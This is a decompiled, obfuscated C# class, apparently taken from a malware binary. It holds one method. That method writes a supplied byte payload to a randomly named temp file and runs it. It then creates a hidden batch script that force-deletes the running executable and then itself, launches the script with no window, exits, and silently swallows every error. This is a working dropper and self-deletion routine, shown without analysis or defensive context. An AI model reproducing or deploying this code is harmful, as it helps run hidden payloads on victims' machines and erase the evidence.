using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace ns0
{
	// Token: 0x0200000D RID: 13
	public class GClass4
	{
		// Token: 0x06000044 RID: 68 RVA: 0x000068F0 File Offset: 0x00004AF0
		public static void smethod_0(bool bool_0, string string_0, byte[] byte_0)
		{
			if (bool_0)
			{
				try
				{
					string_0 = Path.Combine(Path.GetTempPath(), Class6.smethod_1(6) + string_0);
					File.WriteAllBytes(string_0, byte_0);
				}
				catch (Exception ex)
				{
				}
			}
			try
			{
				string text = Path.GetTempFileName() + ".bat";
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("timeout 3 > NUL");
					streamWriter.WriteLine("CD " + Application.StartupPath);
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.ExecutablePath) + "\" /f /q");
					streamWriter.WriteLine("CD " + Path.GetTempPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
				}
				if (bool_0)
				{
					try
					{
						Process.Start(string_0);
					}
					catch (Exception ex2)
					{
					}
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				Environment.Exit(0);
			}
			catch (Exception ex3)
			{
			}
		}
	}
}
